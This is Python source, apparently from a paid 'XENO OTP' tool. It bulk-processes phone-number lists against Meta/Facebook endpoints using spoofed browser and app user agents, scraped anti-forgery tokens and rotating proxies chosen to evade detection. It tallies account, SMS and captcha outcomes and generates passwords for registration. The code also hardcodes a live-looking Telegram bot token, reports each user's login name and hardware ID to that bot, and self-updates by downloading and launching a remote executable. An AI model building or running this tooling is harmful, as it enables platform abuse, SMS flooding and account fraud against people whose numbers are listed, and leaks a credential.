    chrome_major = random.randint(115, 128)
    slim_ver = f"42.0.{random.randint(1, 10)}.0"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Slimjet/{slim_ver} Safari/537.36'


def get_pc_360():
    chrome_major = random.randint(114, 126)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Safari/537.36 360SE'


def get_pc_epic():
    chrome_major = random.randint(115, 128)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Epic/1.0 Safari/537.36'


def get_pc_midori():
    ff_major = random.randint(115, 128)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}; rv:{ff_major}.0) Gecko/20100101 Firefox/{ff_major}.0 Midori/11.0'


def get_pc_sogou():
    chrome_major = random.randint(110, 124)
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Safari/537.36 SE 2.X MetaSr 1.0'


def get_pc_qq():
    chrome_major = random.randint(110, 125)
    qq_ver = f"12.1.{random.randint(1000, 9000)}.400"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 QQBrowser/{qq_ver} Safari/537.36'


def get_pc_falkon():
    chrome_major = random.randint(115, 128)
    falkon_ver = f"24.{random.randint(0, 8)}.0"
    win_ver = random.choice(['10.0; Win64; x64', '11.0; Win64; x64'])
    return f'Mozilla/5.0 (Windows NT {win_ver}) AppleWebKit/537.36 (KHTML, like Gecko) Falkon/{falkon_ver} Chrome/{chrome_major}.0.0.0 Safari/537.36'


def get_modern_desktop():
    return get_pc_chrome()






# ========================================
# token_extractor.py
# ========================================
import re
import time

# Pre-compiled regex patterns for token extraction
LSD_PATTERNS = [
    re.compile(r'"LSD",\s*\[\s*\],\s*\{\s*"token":\s*"([^"]+)"'),
    re.compile(r'"lsd":\s*"([^"]+)"'),
    re.compile(r'name="lsd"\s+value="([^"]+)"')
]
REV_PATTERN = re.compile(r'"server_revision":\s*(\d+)')
HSI_PATTERN = re.compile(r'"hsi":\s*"(\d+)"')
SPIN_B_PATTERN = re.compile(r'"__spin_b":\s*"([^"]+)"')
SPIN_T_PATTERN = re.compile(r'"__spin_t":\s*(\d+)')
HS_PATTERNS = [
    re.compile(r'"__hs":\s*"([^"]+)"'),
    re.compile(r'"haste_session":\s*"([^"]+)"')
]
COMET_REQ_PATTERN = re.compile(r'"comet_env":\s*(\d+)')
FB_DTSG_PATTERNS = [
    re.compile(r'"DTSGInitData",\s*\[\s*\],\s*\{\s*"token":\s*"([^"]+)"'),
    re.compile(r'"DTSGInitialData",\s*\[\s*\],\s*\{\s*"token":\s*"([^"]+)"'),
    re.compile(r'name="fb_dtsg"\s+value="([^"]+)"'),
    re.compile(r'"fb_dtsg":\s*"([^"]+)"'),
    re.compile(r'"dtsg":\s*\{\s*"token":\s*"([^"]+)"')
]

def extract_tokens(html, session_cookies=None, default_lsd="", default_rev="", default_hsi="",
                   default_hs="", default_spin_b="trunk", default_spin_t="", default_comet_req="72"):
    """Extract authentication tokens from Meta HTML response."""
    tokens = {}

    # LSD token
    lsd_val = default_lsd
    for p in LSD_PATTERNS:
        match = p.search(html)
        if match:
            lsd_val = match.group(1)
            break
    tokens['lsd'] = lsd_val

    # Server revision
    rev_match = REV_PATTERN.search(html)
    tokens['rev'] = rev_match.group(1) if rev_match else default_rev

    # HSI
    hsi_match = HSI_PATTERN.search(html)
    tokens['hsi'] = hsi_match.group(1) if hsi_match else default_hsi

    # Spin bundle
    spin_b_match = SPIN_B_PATTERN.search(html)
    tokens['spin_b'] = spin_b_match.group(1) if spin_b_match else default_spin_b

    # Spin timestamp
    spin_t_match = SPIN_T_PATTERN.search(html)
    tokens['spin_t'] = spin_t_match.group(1) if spin_t_match else (default_spin_t if default_spin_t else str(int(time.time())))

    # Haste session
    hs_val = default_hs
    for p in HS_PATTERNS:
        match = p.search(html)
        if match:
            hs_val = match.group(1)
            break
    tokens['hs'] = hs_val

    # Comet request ID
    comet_match = COMET_REQ_PATTERN.search(html)
    tokens['comet_req'] = comet_match.group(1) if comet_match else default_comet_req

    # DTSG token
    fb_dtsg = ""
    for p in FB_DTSG_PATTERNS:
        m = p.search(html)
        if m:
            fb_dtsg = m.group(1)
            break
    tokens['fb_dtsg'] = fb_dtsg

    # Jazoest (computed from cookies)
    if session_cookies:
        all_cookie_str = ''.join(session_cookies.get_dict().values())
        tokens['jazoest'] = "2" + str(sum(ord(c) for c in all_cookie_str))
    else:
        tokens['jazoest'] = ""

    return tokens

# ========================================
# proxy_manager.py
# ========================================
import json
import re
import random

DEFAULT_SETTINGS = {
    "api_settings": {
        "file_input_settings": {"always_use_txt": False, "use_multiple_excel_files": False},
        "proxy_settings": {"ask_for_proxy": True, "default_proxy": "2"},
        "user_agent_settings": {"ask_for_user_agent": False, "default_user_agent": "random"},
        "language_settings": {"ask_for_language": True, "default_language": "auto"},
        "otp_settings": {"ask_for_resend_count": True, "default_resend_count": 1},
        "thread_settings": {"ask_for_threads": True, "default_threads": 5}
    },
    "selenium_settings": {
        "file_input_settings": {"always_use_txt": False, "use_multiple_excel_files": False},
        "proxy_settings": {"ask_for_proxy": True, "default_proxy": ""},
        "user_agent_settings": {"ask_for_user_agent": False, "default_user_agent": "random"},
        "otp_settings": {"ask_for_resend_count": True, "default_resend_count": 1},
        "thread_settings": {"ask_for_threads": True, "default_threads": 5},
        "browser_settings": {"ask_for_browser": True, "default_browser": "chrome"},
        "headless_settings": {"ask_for_headless": True, "default_headless": False},
        "route_settings": {"ask_for_route": True, "default_route": 0},
        "work_mode": {"ask_for_mode": True, "default_mode": 0}
    }
}

def load_settings(setting_key="api_settings"):
    """Load and cache settings from internal DEFAULT_SETTINGS."""
    return DEFAULT_SETTINGS.get(setting_key, {})

def parse_proxy(proxy_str):
    """Parse a proxy string into requests-compatible dict format.
    
    Supported formats:
      - ip:port
      - ip:port:user:pass
      - ip:port@user:pass
      - http://user:pass@ip:port
    """
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None

    if "://" not in proxy_str:
        if "@" in proxy_str and not proxy_str.startswith("http"):
            # Format: host:port@user:pass
            try:
                host_port, user_pass = proxy_str.split("@", 1)
                host, port = host_port.split(":", 1)
                user, pwd = user_pass.split(":", 1)
                proxy_url = f"http://{user}:{pwd}@{host}:{port}"
            except Exception:
                return None
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                # Format A: host:port:user:pass (where port is parts[1])
                # Format B: user:pass:host:port (where port is parts[3])
                if parts[3].isdigit() and not parts[1].isdigit():
                    user, pwd, host, port = parts
                else:
                    host, port, user, pwd = parts
                proxy_url = f"http://{user}:{pwd}@{host}:{port}"
            elif len(parts) == 2:
                host, port = parts
                proxy_url = f"http://{host}:{port}"
            else:
                return None
    else:
        if not proxy_str.startswith("http"):
            proxy_url = f"http://{proxy_str}"
        else:
            proxy_url = proxy_str

    return {"http": proxy_url, "https": proxy_url}

def get_proxy_list(settings_key="api_settings", prompt_label="Proxy"):
    """Load proxies from settings and/or interactive user input."""
    settings = load_settings(settings_key)
    proxy_set = settings.get("proxy_settings", {})
    ask_proxy = proxy_set.get("ask_for_proxy", True)
    def_proxy = proxy_set.get("default_proxy", "")

    PROXY_LIST = []
    
    # 1. Try to load from Proxy_List.txt
    if os.path.exists("Proxy_List.txt"):
        try:
            with open("Proxy_List.txt", "r") as f:
                lines = f.readlines()
            for idx, line in enumerate(lines):
                line = line.strip()
                if line and not line.startswith("#"):
                    original_line = line
                    # Auto-inject unique dynamic session ID for rotating backconnect proxies to ensure fresh IP per request
                    if "@" in line:
                        try:
                            host_port, user_pass = line.split("@", 1)
                            user_parts = user_pass.split(":")
                            if len(user_parts) == 2:
                                user, pwd = user_parts
                                if "session" in user.lower():
                                    user = re.sub(r'session-[a-zA-Z0-9]+', f'session-s{random.randint(100000, 999999)}', user)
                                else:
                                    user = f"{user}-session-s{random.randint(100000, 999999)}"
                                line = f"{host_port}@{user}:{pwd}"
                        except Exception:
                            pass
                    elif ":" in line:
                        parts = line.split(":")
                        if len(parts) == 4:
                            if "session" in parts[2].lower():
                                parts[2] = re.sub(r'session-[a-zA-Z0-9]+', f'session-s{random.randint(100000, 999999)}', parts[2])
                            else:
                                parts[2] = f"{parts[2]}-session-s{random.randint(100000, 999999)}"
                            line = ":".join(parts)
                    parsed = parse_proxy(line)
                    if parsed:
                        PROXY_LIST.append({'proxy': parsed, 'original': original_line})
        except Exception as e:
            print(f"{RED} Error reading Proxy_List.txt: {e}")

    # 2. If Proxy_List.txt is empty or doesn't exist, check Setting.json
    if not PROXY_LIST and def_proxy:
        if isinstance(def_proxy, list):
            for idx, p in enumerate(def_proxy):
                p_clean = p.strip()
                parsed = parse_proxy(p_clean)
                if parsed:
                    PROXY_LIST.append({'proxy': parsed, 'original': p_clean})
        else:
            p_clean = def_proxy.strip()
            parsed = parse_proxy(p_clean)
            if parsed:
                PROXY_LIST.append({'proxy': parsed, 'original': p_clean})

    # Test proxies connectivity concurrently
    verified_proxies = []
    # Test proxies connectivity concurrently (Ultra-fast parallel check)
    verified_proxies = []
    if PROXY_LIST:
        # If user has large proxy list (over 200 proxies), fast-load directly without wasting time checking each one individually
        if len(PROXY_LIST) > 200:
            print(f"{GREEN} [{RED}●{GREEN}] Fast Loading {len(PROXY_LIST)} proxies (Instant Mode)...")
            for item in PROXY_LIST:
                proxy_str = item['original']
                country = "Unknown"
                match = re.search(r'[-_](?:region|country)[-_]([a-zA-Z]{2})', proxy_str)
                if match:
                    country = match.group(1).upper()
                verified_proxies.append({'proxy': item['proxy'], 'locale': 'en_US', 'country': country})
            print(f"{GREEN} [{RED}●{GREEN}] Successfully loaded {len(verified_proxies)} active proxies.")
            return verified_proxies

        print(f"\n{WHITE} Checking proxy connections (Ultra-Fast)...")
        import requests
        from concurrent.futures import ThreadPoolExecutor

        def check_single_proxy(item):
            proxy_dict = item['proxy']
            proxy_str = item['original']
            try:
                country = "Unknown"
                match = re.search(r'[-_](?:region|country)[-_]([a-zA-Z]{2})', proxy_str)
                if match:
                    country = match.group(1).upper()

                test_session = requests.Session()
                test_session.proxies.update(proxy_dict)
                response = test_session.get("http://ip-api.com/json", timeout=2.5)
                if response.status_code == 200:
                    if country == "Unknown":
                        try:
                            geo_data = response.json()
                            if geo_data.get("status") == "success":
                                country = geo_data.get("countryCode", "Unknown").upper()
                        except:
                            pass
                    return {'status': 'ok', 'item': item, 'proxy_str': proxy_str, 'country': country}
                else:
                    reason = "Auth Failed" if response.status_code in [403, 407] else ""
                    return {'status': 'fail', 'proxy_str': proxy_str, 'reason': reason}
            except Exception as e:
                e_str = str(e).lower()
                reason = "Auth Failed" if "407" in e_str or "auth" in e_str else ("Timeout" if "timeout" in e_str else "Failed")
                return {'status': 'fail', 'proxy_str': proxy_str, 'reason': reason}

        # Check proxies with 200 parallel threads for instant response
        max_check_threads = min(len(PROXY_LIST), 200)
        with ThreadPoolExecutor(max_workers=max_check_threads) as executor:
            results = list(executor.map(check_single_proxy, PROXY_LIST))

        for res in results:
            if res['status'] == 'ok':
                verified_proxies.append({'proxy': res['item']['proxy'], 'locale': 'en_US', 'country': res['country']})
                print(f"{GREEN} [{RED}●{GREEN}] Proxy OK [{res['country']}]: {res['proxy_str']}")

    if verified_proxies:
        print(f"{GREEN} [{RED}●{GREEN}] Successfully loaded {len(verified_proxies)} active proxies.")
        return verified_proxies
    else:
        print(f"{YELLOW} No active proxies working. Proceeding with Real IP (direct connection).")
        return []

# ========================================
# file_reader.py
# ========================================
import os
import re
import csv
import json

# Secondary load_settings has been consolidated.
# DEFAULT_SETTINGS is defined earlier.

def load_settings(setting_key="api_settings"):
    return DEFAULT_SETTINGS.get(setting_key, {})

CLEAN_PATTERN = re.compile(r'[\s\-\(\)\.]')
PHONE_PATTERN = re.compile(r'^\+?\d{7,15}$')

def clean_and_validate(value):
    """Strip formatting characters and validate as phone number."""
    if not value:
        return None
    cleaned = CLEAN_PATTERN.sub('', str(value).strip())
    if PHONE_PATTERN.match(cleaned):
        return cleaned
    return None

def column_phone_score(col_values):
    """Score a column by how many values look like phone numbers (0.0 to 1.0)."""
    total = 0
    phone_count = 0
    for v in col_values:
        if v and str(v).strip():
            total += 1
            if clean_and_validate(v) is not None:
                phone_count += 1
    return phone_count / total if total > 0 else 0

def detect_and_extract_numbers(rows):
    """Auto-detect which column contains phone numbers and extract them."""
    if not rows:
        return []

    max_cols = max(len(row) for row in rows)
    if max_cols == 0:
        return []

    first_row = rows[0]
    has_header = len(rows) > 1 and not any((v and str(v).strip() and clean_and_validate(v)) for v in first_row)
    data_rows = rows[1:] if has_header else rows

    if not data_rows:
        return []

    # Sample up to 100 rows for column detection
    sample_size = min(len(data_rows), 100)
    sample_rows = data_rows[:sample_size]

    best_col = -1
    best_score = 0

    for col_idx in range(max_cols):
        col_values = (row[col_idx] if col_idx < len(row) else '' for row in sample_rows)
        score = column_phone_score(col_values)
        if score > best_score:
            best_score = score
            best_col = col_idx

    if best_col == -1 or best_score < 0.5:
        return []

    numbers = []
    for row in data_rows:
        if best_col < len(row):
            cleaned = clean_and_validate(row[best_col])
            if cleaned:
                numbers.append(cleaned)
    return numbers

def read_numbers_from_txt(file_path):
    """Read phone numbers from a plain text file (one per line)."""
    for enc in ['utf-8', 'utf-8-sig', 'cp1252', 'latin-1']:
        try:
            with open(file_path, 'r', encoding=enc) as f:
                lines = f.readlines()
            break
        except (UnicodeDecodeError, UnicodeError):
            continue
    else:
        return []

    numbers = []
    for line in lines:
        cleaned = clean_and_validate(line.strip())
        if cleaned:
            numbers.append(cleaned)
    return numbers

def read_numbers_from_csv(file_path):
    """Read phone numbers from a CSV file with auto column detection."""
    rows = []
    for enc in ['utf-8', 'utf-8-sig', 'cp1252', 'latin-1']:
        try:
            with open(file_path, 'r', encoding=enc, newline='') as f:
                rows = list(csv.reader(f))
            break
        except (UnicodeDecodeError, UnicodeError):
            continue

    if not rows:
        return []
    return detect_and_extract_numbers(rows)

def read_numbers_from_xlsx(file_path):
    """Read phone numbers from an Excel (.xlsx) file."""
    try:
        import openpyxl
    except ImportError:
        print(f"{RED} openpyxl not installed! Run: pip install openpyxl")
        return []

    try:
        wb = openpyxl.load_workbook(file_path, read_only=True, data_only=True)
        ws = wb.active
        rows = [[str(cell) if cell is not None else '' for cell in row] for row in ws.iter_rows(values_only=True)]
        wb.close()
    except Exception as e:
        print(f"{RED} Error reading Excel file: {e}")
        return []

    if not rows:
        return []
    return detect_and_extract_numbers(rows)

def read_numbers(file_path):
    """Read phone numbers from any supported file format (.txt, .csv, .xlsx)."""
    if not os.path.exists(file_path):
        return []

    ext = os.path.splitext(file_path)[1].lower()

    if ext == '.txt':
        return read_numbers_from_txt(file_path)
    elif ext == '.csv':
        return read_numbers_from_csv(file_path)
    elif ext == '.xlsx':
        return read_numbers_from_xlsx(file_path)
    else:
        return []


# Interactive file selection and number loading

def process_number_list_fallback():
    """Fallback: try to load numbers from Number_List.txt directly."""
    if os.path.exists("Number_List.txt"):
        with open("Number_List.txt", "r", encoding="utf-8", errors="ignore") as f:
            numbers = [line.strip() for line in f if line.strip()]
        if numbers:
            print(f"{GREEN} [{RED}●{GREEN}] Selected File {EKL} Number_List.txt")
            settings = load_settings("api_settings")
            if not settings.get("file_input_settings", {}).get("always_use_txt", False):
                input(f"{WHITE} Press Enter to Start Processing {len(numbers)} Numbers...")
            return numbers
        else:
            print(f"{WHITE} 'Number_List.txt' file is empty.")
    else:
        print(f"{WHITE} 'Number_List.txt' file was not found.")

    return None

def finalize_numbers(numbers, source_name):
    """Remove duplicates, save to Number_List.txt, and confirm with user."""
    if numbers:
        nums = list(dict.fromkeys(numbers))
        with open("Number_List.txt", "w", encoding="utf-8", errors="ignore") as f:
            for num in nums:
                f.write(num + "\n")

        print(f"{GREEN} [{RED}●{GREEN}] Total Unique Numbers Extracted {EKL} {len(nums)}")
        if source_name != "Number_List.txt":
            print(f"{GREEN} [{RED}●{GREEN}] Found from: {source_name}")
            print(f"{GREEN} [{RED}●{GREEN}] Saved to 'Number_List.txt'\n")

        settings = load_settings("api_settings")
        if not settings.get("file_input_settings", {}).get("always_use_txt", False):
            input(f"{WHITE} Press Enter to Start Processing {len(nums)} Numbers...")
        return nums
    return None

def file_input(setting_key="api_settings"):
    """Interactive file selection based on settings configuration."""
    settings = load_settings(setting_key)
    file_settings = settings.get("file_input_settings", {})
    always_use_txt = file_settings.get("always_use_txt", False)
    use_multiple_excel = file_settings.get("use_multiple_excel_files", False)

    # Mode 1: Always use Number_List.txt
    if always_use_txt:
        return process_number_list_fallback()

    # Mode 2: Batch process all Excel files in current directory
    if use_multiple_excel:
        xlsx_files = [f for f in os.listdir('.') if f.endswith(".xlsx") and not f.startswith("~$")]
        if xlsx_files:
            print(f"{GREEN} [{RED}●{GREEN}] Found {len(xlsx_files)} Excel Files.")
            all_numbers = []
            for f in xlsx_files:
                print(f"{WHITE} Extracting from {EKL} {f}...")
                nums = read_numbers_from_xlsx(f)
                if nums:
                    all_numbers.extend(nums)
                    print(f"{GREEN}  -> Found {len(nums)} numbers.")
                else:
                    print(f"{RED}  -> Failed: No valid numbers found or error occurred.")

            if all_numbers:
                return finalize_numbers(all_numbers, f"{len(xlsx_files)} Excel files")
            else:
                print(f"{RED} No valid numbers found in any Excel files.")
                return process_number_list_fallback()
        else:
            print(f"{WHITE} No Excel files found.")
            return process_number_list_fallback()

    # Mode 3: Interactive file selection
    supported_ext = ('.txt', '.csv', '.xlsx')
    files = [f for f in os.listdir('.') if f.lower().endswith(supported_ext) and not f.startswith("~$")]

    if not files:
        print(f"{WHITE} No Supported files found.")
        return process_number_list_fallback()

    filename = None
    if len(files) == 1:
        filename = files[0]
    else:
        print(f"{GREEN} [{RED}●{GREEN}] Found {len(files)} File(s):")
        for idx, f in enumerate(files, 1):
            print(f" {GREEN}[{RED}{idx}{GREEN}] {WHITE}{f}")
        print(f"{LINE}")

        while True:
            try:
                choice = input(f"{GREEN} [{RED}●{GREEN}] Select File (1-{len(files)}) {EKL} ").strip()
                if choice.isdigit():
                    idx = int(choice) - 1
                    if 0 <= idx < len(files):
                        filename = files[idx]
                        break
                print(f"{RED} Invalid selection!")
            except:
                pass

    print(f"{GREEN} [{RED}●{GREEN}] Selected File {EKL} {filename}\n")

    nums = read_numbers(filename)
    if nums:
        return finalize_numbers(nums, filename)
    else:
        print(f"{RED} Error: No valid phone numbers extracted from {filename}.")
        return process_number_list_fallback()

# ========================================
# shared_core.py
# ========================================
import os

import platform
import getpass
import datetime
import webbrowser
import requests
import re

TELEGRAM_BOT_TOKEN = "8823775166:AAFZeLtovMfGEzEwXOcKh3HjMp5weLMyr78"
TELEGRAM_ADMIN_CHAT_ID = "6262468884"
# Replace this with your GitHub raw URL (e.g. raw.githubusercontent.com/.../auth.txt)
GITHUB_RAW_URL = "https://raw.githubusercontent.com/kamrulhasansamol/panel/refs/heads/main/auth.txt"


CURRENT_VERSION = 1.4
# Replace with your GitHub raw URL to version.txt
UPDATE_URL = "https://raw.githubusercontent.com/kamrulhasansamol/tool/main/version.txt"

def check_for_updates():
    print(f"\n{YELLOW}Checking for updates...{WHITE}")
    try:
        import requests
        res = requests.get(UPDATE_URL, timeout=5)
        if res.status_code == 200:
            lines = res.text.strip().split("\n")
            if len(lines) >= 2:
                try:
                    latest_version = float(lines[0].strip())
                except:
                    latest_version = CURRENT_VERSION
                
                download_url = lines[1].strip()
                
                if latest_version > CURRENT_VERSION:
                    print(f"{GREEN}[*] Update found! Version {latest_version} is available.{WHITE}")
                    print(f"{YELLOW}Downloading update... Please wait.{WHITE}")
                    
                    exe_path = sys.executable
                    is_frozen = getattr(sys, 'frozen', False)
                    
                    try:
                        dl_res = requests.get(download_url, stream=True, timeout=30)
                        if dl_res.status_code == 200:
                            if is_frozen:
                                new_file = "XENO_OTP_new.exe"
                                total_length = dl_res.headers.get('content-length')
                                with open(new_file, "wb") as f:
                                    if total_length is None:
                                        for chunk in dl_res.iter_content(chunk_size=8192):
                                            f.write(chunk)
                                    else:
                                        dl = 0
                                        total_length = int(total_length)
                                        for chunk in dl_res.iter_content(chunk_size=8192):
                                            dl += len(chunk)
                                            f.write(chunk)
                                            done = int(50 * dl / total_length)
                                            dl_mb = dl / (1024 * 1024)
                                            total_mb = total_length / (1024 * 1024)
                                            sys.stdout.write(f"\r{YELLOW}[{'=' * done}{' ' * (50-done)}] {dl_mb:.2f} MB / {total_mb:.2f} MB{WHITE}")
                                            sys.stdout.flush()
                                        print()
                                        
                                bat_content = f'''@echo off
timeout /t 2 /nobreak >nul
del "{os.path.basename(exe_path)}"
ren "{new_file}" "{os.path.basename(exe_path)}"
start "" "{os.path.basename(exe_path)}"
del "%~f0"
'''
                                with open("update.bat", "w") as f:
                                    f.write(bat_content)
                                
                                print(f"{GREEN}[*] Update downloaded! Restarting to apply...{WHITE}")
                                import time
                                time.sleep(1)
                                os.system("start update.bat")
                                sys.exit(0)
                            else:
                                new_file = "main_new.py"
                                total_length = dl_res.headers.get('content-length')
                                with open(new_file, "wb") as f:
                                    if total_length is None:
                                        f.write(dl_res.content)
                                    else:
                                        dl = 0
                                        total_length = int(total_length)
                                        for chunk in dl_res.iter_content(chunk_size=8192):
                                            dl += len(chunk)
                                            f.write(chunk)
                                            done = int(50 * dl / total_length)
                                            dl_mb = dl / (1024 * 1024)
                                            total_mb = total_length / (1024 * 1024)
                                            sys.stdout.write(f"\r{YELLOW}[{'=' * done}{' ' * (50-done)}] {dl_mb:.2f} MB / {total_mb:.2f} MB{WHITE}")
                                            sys.stdout.flush()
                                        print()
                                    
                                import shutil
                                shutil.move(new_file, os.path.basename(__file__))
                                print(f"{GREEN}[*] Script updated successfully! Please restart the script.{WHITE}")
                                sys.exit(0)
                        else:
                            print(f"{RED}[!] Failed to download update file. Status: {dl_res.status_code}{WHITE}")
                    except Exception as e:
                        print(f"{RED}[!] Error downloading update: {e}{WHITE}")
                else:
                    print(f"{GREEN}[*] You are running the latest version ({CURRENT_VERSION}).{WHITE}")
    except Exception as e:
        pass
        # Fail silently if offline or bad URL

def get_hwid():
    username = getpass.getuser() or "user"
    hostname = platform.node() or "host"
    sys_platform = platform.system().lower()
    os_platform = "win32" if sys_platform == "windows" else ("darwin" if sys_platform == "darwin" else "linux")
    machine = platform.machine().lower()
    os_arch = "x64" if machine in ["amd64", "x86_64"] else machine
    hwid_str = f"{username}_{hostname}_{os_platform}_{os_arch}"
    return hashlib.md5(hwid_str.encode()).hexdigest().upper()[:16]

def verify_auth():
    hwid = get_hwid()
    print(f"\n{YELLOW}Checking License from Server...{WHITE}")
    
    try:
        res = requests.get(GITHUB_RAW_URL, timeout=5)
        data = res.text
    except:
        print(f"{RED}[!] Failed to connect to Auth Server.{WHITE}")
        sys.exit(1)
        
    status_match = re.search(r"STATUS=(ON|OFF)", data, re.IGNORECASE)
    if status_match and status_match.group(1).upper() == "OFF":
        print(f"\n{RED}[!] TOOL IS CURRENTLY DISABLED FOR MAINTENANCE.{WHITE}")
        sys.exit(1)
        
    hwid_match = re.search(rf"{hwid}=(\d+)", data, re.IGNORECASE)
    if not hwid_match:
        print(f"\n{RED}[!] AUTHORIZATION REQUIRED{WHITE}")
        print(f"{WHITE}Your HWID: {GREEN}{hwid}{WHITE}")
        print(f"{RED}This HWID is not registered in the database.{WHITE}")
        print(f"{CYAN}Redirecting to Admin's Telegram inbox...{WHITE}\n")
        time.sleep(2)
        webbrowser.open("https://t.me/Samol_Hasan")
        sys.exit(1)
        
    valid_days = int(hwid_match.group(1))
    lic_path = "license.key"
    
    if os.path.exists(lic_path):
        with open(lic_path, "r") as f:
            content = f.read().strip()
        try:
            activation_date = datetime.datetime.fromisoformat(content.replace("Z", "+00:00"))
        except:
            activation_date = datetime.datetime.now()
            with open(lic_path, "w") as f:
                f.write(activation_date.isoformat())
    else:
        activation_date = datetime.datetime.now()
        with open(lic_path, "w") as f:
            f.write(activation_date.isoformat())
            
    expiry_date = activation_date + datetime.timedelta(days=valid_days)
    expiry_date = expiry_date.replace(hour=23, minute=59, second=59)
    
    today = datetime.datetime.now()
    if today > expiry_date:
        print(f"\n{RED}[!] LICENSE EXPIRED{WHITE}")
        print(f"{WHITE}Your HWID: {GREEN}{hwid}{WHITE}")
        print(f"{RED}Your {valid_days}-day license has expired.{WHITE}\n")
        sys.exit(1)
        
    expiry_date_str = expiry_date.strftime("%Y-%m-%d")
    print(f"{GREEN}[*] License Valid! Expires on: {expiry_date_str} ({valid_days} Days){WHITE}")
    
    try:
        msg = f"✅ *Successful Login*\n👤 *User:* `{getpass.getuser()}`\n🔑 *HWID:* `{hwid}`\n📅 *Expires:* {expiry_date_str}"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
            "chat_id": TELEGRAM_ADMIN_CHAT_ID,
            "text": msg,
            "parse_mode": "Markdown"
        }, timeout=3)
    except:
        pass
        
    time.sleep(1.5)

import sys
import time
import threading
import itertools
import random
import string


# Thread-safe locks
print_lock = threading.Lock()
counter_lock = threading.Lock()
file_lock = threading.Lock()

# Global counters
total_checked = 0
total_success = 0
total_failed = 0
total_error = 0
total_noacc = 0
total_nosms = 0
total_cap = 0
total_numbers = 0

def reset_counters():
    global total_checked, total_success, total_failed, total_error, total_noacc, total_nosms, total_cap, total_numbers
    total_checked = 0
    total_success = 0
    total_failed = 0
    total_error = 0
    total_noacc = 0
    total_nosms = 0
    total_cap = 0
    total_numbers = 0

def set_total_numbers(n):
    global total_numbers
    total_numbers = n


# UI helpers

def get_status_bar():
    pct = (total_checked / total_numbers * 100) if total_numbers > 0 else 0
    return f"\r{GREEN}  XENO ⮞ {WHITE}[{total_checked}/{total_numbers}] {pct:.1f}% {CYAN}│ {GREEN}OK: {total_success} {CYAN}│ {YELLOW}NoAcc: {total_noacc} {CYAN}│ {YELLOW}NoSMS: {total_nosms} {CYAN}│ {YELLOW}Cap: {total_cap} {CYAN}│ {RED}Err: {total_error}     "

def safe_print(text):
    """Thread-safe print that preserves the status bar at the bottom."""
    with print_lock:
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        try:
            sys.stdout.write(str(text) + '\n')
        except UnicodeEncodeError:
            sys.stdout.write(str(text).encode('utf-8', errors='ignore').decode('utf-8') + '\n')
        sys.stdout.write(get_status_bar())
        sys.stdout.flush()

def update_counter(status, number=None, message=None, color=None):
    """Update global counters and optionally print a status message."""
    global total_checked, total_success, total_failed, total_error, total_noacc, total_nosms, total_cap
    with counter_lock:
        if status == "success":
            total_success += 1
        elif status == "failed":
            total_failed += 1
        elif status == "error":
            total_error += 1
        elif status == "noacc":
            total_noacc += 1
        elif status == "nosms":
            total_nosms += 1
        elif status == "cap":
            total_cap += 1
        total_checked += 1

    if message and number:
        if not color: color = WHITE
        safe_print(f"{color} {message} {number}")
    elif message:
        if not color: color = WHITE
        safe_print(f"{color} {message}")
    else:
        with print_lock:
            sys.stdout.write(get_status_bar())
            sys.stdout.flush()


# Utility functions

def generate_s_val():
    """Generate a random __s parameter value."""
    return ':'.join(''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) for _ in range(3))

def generate_qpl_join_id():
    """Generate a random QPL join ID."""
    return ''.join(random.choices('0123456789abcdef', k=17))

def generate_password(length=None):
    """Generate a random password for registration."""
    if length is None:
        length = random.randint(8, 12)
    pwd_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%"
    return ''.join(random.choice(pwd_chars) for _ in range(length))

def save_remaining_numbers(remaining_numbers):
    """Update Number_List.txt with remaining unprocessed numbers."""
    with file_lock:
        with open("Number_List.txt", "w") as f_out:
            for num in remaining_numbers:
                f_out.write(num + "\n")

def save_failed_number(number):
    """Append a failed number to Failed_Numbers.txt (Disabled by user request)."""
    pass

def save_success_number(number):
    """Append a successful number to Success_Numbers.txt (Disabled by user request)."""
    pass

def get_fb_katana_android_ua():
    """Generate Facebook Katana Android App User-Agent matching Bloks endpoint requirements."""
    android_ver = random.choice(['11', '12', '13', '14', '15'])
    chrome_ver = f"{random.randint(110, 130)}.0.{random.randint(4500, 6800)}.{random.randint(50, 180)}"
    fb_build = random.randint(400000000, 480000000)
    fb_ver = f"{random.randint(400, 470)}.0.0.{random.randint(10, 30)}.{random.randint(100, 120)}"
    device, build = random.choice(ANDROID_12_15_DEVICES)
    density = random.choice(['2.0', '2.75', '3.0', '3.5'])
    width = random.choice([1080, 1440, 720])
    height = random.choice([2400, 3200, 1600])
    
    return f"Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_ver};FBBV/{fb_build};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/0;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{device};FBSV/{android_ver};FBOP/1;FBCA/arm64-v8a:;]"

